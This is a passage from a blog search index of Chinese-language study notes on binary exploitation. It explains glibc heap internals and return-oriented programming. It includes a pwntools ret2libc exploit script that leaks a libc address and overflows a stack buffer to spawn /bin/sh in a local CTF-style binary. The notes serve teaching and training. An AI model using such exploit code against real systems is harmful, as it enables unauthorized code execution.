<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Angr入门笔记（一）</title>
      <link href="/2020/06/29/Angr%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F%C3%BA%C2%BF%E2%95%A5%E2%95%97%C3%BA%E2%8C%90/"/>
      <url>/2020/06/29/Angr%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F%C3%BA%C2%BF%E2%95%A5%E2%95%97%C3%BA%E2%8C%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>长亭PWN笔记03</title>
      <link href="/2020/05/04/%E2%94%82%C3%B1%E2%95%90%C3%B1PWN%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F03/"/>
      <url>/2020/05/04/%E2%94%82%C3%B1%E2%95%90%C3%B1PWN%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F03/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是堆</li><li>glibc的堆管理实现<ul><li>arena</li><li>bins</li><li>chunk</li></ul></li><li>malloc和free的工作流程</li><li>fastbin attack  </li><li>新版本glibc中的tcache</li><li>堆的花式玩法</li></ul><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200501204507.png" alt=" "></p><ul><li>栈通常用于为函数分配固定大小的局部内存</li><li>堆是可以根据运行时的需要进行动态分配和释放的内存，大小可变<ul><li>Malloc/New</li><li>Free/Delete</li></ul></li><li>堆的实现重点关注内存块的组织和管理方式，尤其是空闲内存块<ul><li>如何提高分配和释放效率</li><li>如何降低碎片化，提高空间利用率</li></ul></li><li>举例：浏览器的DOM树通常分配在堆上<ul><li>堆的实现算法影响堆分配网页加载和动态效果速度</li><li>堆的实现算法影响浏览器对内存的使用效率 </li></ul></li></ul><h2 id="常见堆实现"><a href="#常见堆实现" class="headerlink" title="常见堆实现"></a>常见堆实现</h2><ul><li>dlmalloc - 通用分配器</li><li>ptmalloc2 - glibc<ul><li>基于dlmalloc fork出来，在2006年增加了多线程支持</li></ul></li><li>jemalloc - FreeBSD、Firefox、Android</li><li>tcmalloc - Google Chrome</li><li>libumem - Solaris</li><li>Windows 10 - segment heap</li></ul><h2 id="ptmalloc2的多线程支持"><a href="#ptmalloc2的多线程支持" class="headerlink" title="ptmalloc2的多线程支持"></a>ptmalloc2的多线程支持</h2><ul><li>不同的线程维护不同的堆，称为<strong>per thread arena</strong></li><li>主线程创建的堆，称为<strong>main arena</strong></li><li>Arena数量受到CPU核数的限制<ul><li>对于32位系统：arena数量上限 = 2 * 核数</li><li>对于64位系统：arena数量上限 = 8 * 核数</li></ul></li></ul><h2 id="glibc的堆管理实现"><a href="#glibc的堆管理实现" class="headerlink" title="glibc的堆管理实现"></a>glibc的堆管理实现</h2><ul><li>arena<ul><li>指的是堆内存区域本身，并非结构</li><li>主线程的main arena通过sbrk创建</li><li>其他线程arena通过mmap创建</li></ul></li><li>malloc_state<ul><li>管理arena的核心结构，包含堆的状态信息、bins链表等</li><li>main arena对应的malloc_state结构存储在glibc的全局变量中</li><li>其他线程arena对应的malloc_state存储在arena本身当中</li></ul></li><li>bins<ul><li>bins用来管理空闲内存块，通常使用链表结构来进行组织</li></ul></li><li>chunks<ul><li>内存块的结构</li></ul></li></ul><blockquote><p>注意：</p><p>（1）以下介绍的堆管理环境为glibc 2.26 以下（不含2.26），即出现tcache之前的堆管理方式</p><p>（2）以下演示的环境均是64位程序及操作系统 </p></blockquote><h2 id="Arena头部结构：malloc-state"><a href="#Arena头部结构：malloc-state" class="headerlink" title="Arena头部结构：malloc_state"></a>Arena头部结构：malloc_state</h2><p>malloc_state存储了Arena的状态，其中包括了很多用于管理空闲块的bins链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"><span class="keyword">mutex_t</span> mutex; <span class="comment">/* 同步访问相关，互斥锁 */</span></span><br><span class="line"><span class="keyword">int</span> flags; <span class="comment">/* 标志位，以前是max_fast，在一些老的文章上可能还使用的这个说法，比如phrack */</span></span><br><span class="line">mfastbinptr fastbins[NFASTBINS]; <span class="comment">/* fastbins，之后会说到,是一个chunk的链表 */</span></span><br><span class="line">mchunkptr top; <span class="comment">/* top chunk，一个特殊的chunk，在之后会说到 */</span></span><br><span class="line">mchunkptr last_remainder; <span class="comment">/* 最后一次拆分top chunk得到的剩余内容，之后会说到 */</span></span><br><span class="line">mchunkptr bins[BINS * <span class="number">2</span>]; <span class="comment">/* bins，一个chunk的链表的数组，之后会说到 */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE]; <span class="comment">/* bins是否为空的一个位图 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span> <span class="comment">/* 链表，下一个malloc_state的位置 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mallo_state</span> <span class="title">main_arena</span>;</span><span class="comment">/*global variable in libc.so*/</span></span><br></pre></td></tr></table></figure><p>主线程的malloc_state结构存储在glibc的全局变量中，变量名为main_arena</p><h2 id="Main-Arena概览"><a href="#Main-Arena概览" class="headerlink" title="Main Arena概览"></a>Main Arena概览</h2><p><img src="C:%5CUsers%5Csyc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200501213413134.png" alt></p><h2 id="空闲内存块-free-chunk-结构"><a href="#空闲内存块-free-chunk-结构" class="headerlink" title="空闲内存块(free chunk)结构"></a>空闲内存块(free chunk)结构</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502160807.png" alt></p><p>在64位平台下，free chunk的第一个字段prev_size（8字节）存储了前一个chunk的大小</p><p>free chunk的第二个字段size记录了当前chunk的大小，该字段最低三个bit被用作其他含义</p><ul><li>P代表PREV_INUSE，即代表前一个chunk是否被使用</li><li>M代表IS_MMAPPED，代表当前chunk是否属于mmap出来的</li><li>N代表NON_MAIN_ARENA，代表该chunk是否属于非MAIN Arena</li></ul><p>第三个字段fd和第四个字段bk（8字节）前向指针和后向指针，这两个字段用于bin链表当中，用来链接大小相同或者相近的free chunk，便于后续分配时查找</p><h2 id="已分配内存块（allocated-chunk）结构"><a href="#已分配内存块（allocated-chunk）结构" class="headerlink" title="已分配内存块（allocated chunk）结构"></a>已分配内存块（allocated chunk）结构</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502163306.png" alt></p><p>allocated chunk的前两个字段和free chunk相通</p><p>第三个字段开始到最后，chunk中存储的都是用户数据。甚至下一个chunk的第一个字段prev_size，也可以被用来存放数据，原因是这个prev_size字段只有当“前一个”chunk是free的时候才有意义，如果“前一个”chunk是已经分配的，堆管理器并不关心</p><p>所以对一个chunk来说，用户可用大小从偏移+8开始，一直到下一个chunk的orev_size字段</p><p>在64位平台下，chunk的大小一定是0x10字节的整数倍。malloc返回的指针为图中mem指向的位置，即数据开头</p><h2 id="malloc参数与chunk大小的关系"><a href="#malloc参数与chunk大小的关系" class="headerlink" title="malloc参数与chunk大小的关系"></a>malloc参数与chunk大小的关系</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502223237.png" alt></p><ul><li>malloc参数为用户申请的内存大小</li><li>chunk包含数据和metadata</li><li>返回的chunk只要保证其中可用数据大小等于用户申请即可</li><li>在x86 32位平台下chunk的大小一定是8字节的整数倍；x64平台下，chunk的大小一定是16字节的整数倍</li></ul><h2 id="Bins结构"><a href="#Bins结构" class="headerlink" title="Bins结构"></a>Bins结构</h2><ul><li>BIns是用来管理和组织<strong>空闲</strong>内存块的链表结构，根据chunk的大小和状态，有许多种不同的Bins结构</li><li>Fast bins<ul><li>用于管理小的chunk</li></ul></li><li>Bins<ul><li>small bins - 用于管理中等大小的chunk</li><li>large bins - 用于管理较大的chunk</li><li>unsorted bins - 用于存放未整理的chunk</li></ul></li></ul><h2 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>大小<ul><li>x86_32平台：16~64字节</li><li>x64平台：32~128字节</li></ul></li><li>相同大小的chunk放在一个bin中</li><li>单向链表</li><li>后进先出（FILO，First in last out）</li><li>相邻的空闲fastbin chunk不会被合并</li><li>当chunk被free时，不会清理PREV_INUSE标志</li></ul><h2 id="Fast-bins在内存中的结构示例"><a href="#Fast-bins在内存中的结构示例" class="headerlink" title="Fast bins在内存中的结构示例"></a>Fast bins在内存中的结构示例</h2><p>源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a1,<span class="number">0x41</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a2,<span class="number">0x42</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a3,<span class="number">0x43</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Malloc done!\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a1);</span><br><span class="line">    <span class="built_in">free</span>(a2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Free done\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><ul><li>下断点在<code>printf(&quot;Malloc done!\n&quot;);</code></li></ul><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502230606.png" alt></p><ul><li>下断点在<code>printf(&quot;Free done\n&quot;);</code></li></ul><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/Pwn%E6%9C%AF%E8%BF%9B%E9%98%B6%EF%BC%8C%E7%8E%A9%E8%BD%AC%E5%A0%86%E6%BA%A2%E5%87%BA/QQ%E5%9B%BE%E7%89%8720200502230919.png" alt></p><h2 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>chunk大小 &lt; 1024 bytes(64bit)</li><li>相同大小的chunk放在一个bin中</li><li>双向循环链表</li><li>先进先出（First in first out）</li><li>当有空闲块相邻时，chunk会被合并成一个更大的chunk</li><li>bins[2],bins[3],…,bins[124],bins[125]共62组smallbin，大小范围[0x20,0x3f0]（64位）</li></ul><h2 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>chunk大小 &gt;= 1024 bytes(64bit)</li><li>每组bin表示一组size范围而不是具体的size，例如bins[126],bins[127]的链表中保存长度在[0x400,0x440]的chunk</li><li>双向循环链表</li><li>先进先出</li><li>chunk按照大小从大到小的排序</li><li>当有空闲块相邻，chunk会被合并</li><li>bins[126],bins[127],…,bins[250],bins[251]共63组largebin，大小范围[0x400,X]（64位）</li></ul><h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line">    <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">    mchunkptr top;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">    mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">    <span class="comment">/*..*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>64位平台中：chunk大小&gt;128字节</li><li>只存在唯一一个unsorted bin</li><li>双向循环链表</li><li>当一个chunk（非fastbin）被free，它首先被放入unsorted bin，等后续整理时才会放入对应的small bin/fast bin</li><li>bins[0],bins[1]</li></ul><h2 id="Unsorted-bins与small-bins"><a href="#Unsorted-bins与small-bins" class="headerlink" title="Unsorted bins与small bins"></a>Unsorted bins与small bins</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/S6.png" alt></p><h2 id="其他chunk"><a href="#其他chunk" class="headerlink" title="其他chunk"></a>其他chunk</h2><ul><li>Top chunk<ul><li>不属于任何bin</li><li>在arena中处于最高地址</li><li>当没有其他空闲块时，top chunk就会被用于分配</li><li>分裂时<ul><li>一块是请求大小的chunk</li><li>另一块余下chunk将成为新的Top chunk</li></ul></li></ul></li><li>Last_remainder<ul><li>当请求small chunk大小的内存时，如发生分裂，则剩余的chunk保存为last_remainder</li></ul></li></ul><h2 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h2><ol><li>如果在size &lt; max fast，在fast bins中寻找fast chunk，如找到则结束</li><li>如果size in_smallbin_range，在small bins中寻找small chunk，如找到则结束</li><li>如果size not in_smallbin_range，合并所有fastbin的chunk</li><li>循环：<ol><li>检查unsorted bin中的last_remainder<ul><li>如果满足一定条件，则分裂之，将剩余的chunk标记为新的last_remainder</li></ul></li><li>在unsorted bin中搜索，同时进行整理<ul><li>如遇到精确大小，则返回，否则就把当前chunk整理到small/large bin中去</li></ul></li><li>在small bin和large bin中搜索最合适的chunk（不一定是精确大小）</li></ol></li><li>使用top chunk</li></ol><h2 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h2><ol><li>如果size &lt; masx fast，放入fast bin，结束</li><li>如果前一个chunk是free的<ol><li>unlink前面的chunk</li><li>合并两个chunk，并放入unsorted bin</li></ol></li><li>如果后一个chunk是top chunk，则将当前chunk并入top chunk</li><li>如果后一个chunk是free的<ol><li>unlink后面的chunk</li><li>合并两个chunk，并放入unsorted bin</li></ol></li><li>前后chunk都不是free的，放入unsorted bin</li></ol><blockquote><p>相当于所有的chunk在被free时只有三种去路：放入fastbin、放入unsortbin、并入top chunk</p></blockquote><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *A,*B,*C,*D;</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    D = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="built_in">free</span>(C);</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">free</span>(B)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配完malloc之后：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503114458.png" alt></p><p>执行free之后：</p><p>再次执行<code>A = malloc(0x100 - 8)</code>：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503114752.png" alt></p><p>再次<code>free(A)</code>：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503114907.png" alt></p><p>再次<code>A = malloc(0x80 - 8)</code>：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115030.png" alt></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115156.png" alt></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115251.png" alt></p><p>执行<code>free(B)</code>后：</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200503115440.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>长亭PWN笔记02</title>
      <link href="/2020/04/26/%E2%94%82%C3%B1%E2%95%90%C3%B1PWN%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F02/"/>
      <url>/2020/04/26/%E2%94%82%C3%B1%E2%95%90%C3%B1PWN%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F02/</url>
      
        <content type="html"><![CDATA[<ul><li>ROP实战技巧之一：连接多个libc函数调用</li><li>ROPP实战技巧之二：栈迁移(Stack Pivot)</li><li>ROP案例详解</li><li>x64下的ROP</li><li>ROP和GOT表劫持相关缓解技术</li></ul><h2 id="回顾：栈布局"><a href="#回顾：栈布局" class="headerlink" title="回顾：栈布局"></a>回顾：栈布局</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163406.png" alt></p><h2 id="回顾：Return-to-Libc"><a href="#回顾：Return-to-Libc" class="headerlink" title="回顾：Return to Libc"></a>回顾：Return to Libc</h2><p>一次在栈上布置system、exit、binsh、0，即可连续调用system(“/bin/sh”)和exit(0)</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163511.png" alt></p><p>那如何串联3次或更多的libc函数调用？如果libc函数有2个以上的参数，如何不是ROP Payload？例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(fd,buf,size)</span><br><span class="line">write(fd,buf,size)</span><br></pre></td></tr></table></figure><p>DEMO代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">"./ret2libc"</span>)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">"This is your gift: "</span>)</span><br><span class="line">setvbuf_addr = int(io.recvline().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc.sym就是offset</span></span><br><span class="line">libc_base = setvbuf_addr - libc.sym[<span class="string">"setvbuf"</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">log.info(<span class="string">"setvbuf_addr:0x%x"</span>) % setvbuf_addr)</span><br><span class="line">log.info(<span class="string">"libc_base:0x%x"</span>) % libc_base)</span><br><span class="line">log.info(<span class="string">"system_addr:0x%x"</span>) % system_addr)</span><br><span class="line">log.info(<span class="string">"binsh_addr:0x%x"</span>) % binsh_addr)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"A"</span>*<span class="number">0x68</span> + <span class="string">"B"</span>*<span class="number">4</span></span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += <span class="string">'CCCC'</span></span><br><span class="line">pay += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="连接多个libc函数调用"><a href="#连接多个libc函数调用" class="headerlink" title="连接多个libc函数调用"></a>连接多个libc函数调用</h2><p>例如要连接<code>read(fd1,buf1,size1)</code>和<code>write(fd2,buf2,size2)</code>两个函数调用，无法按照<code>system(&quot;/bin/sh&quot;)</code>和<code>exit(0)</code>那样布置ROP 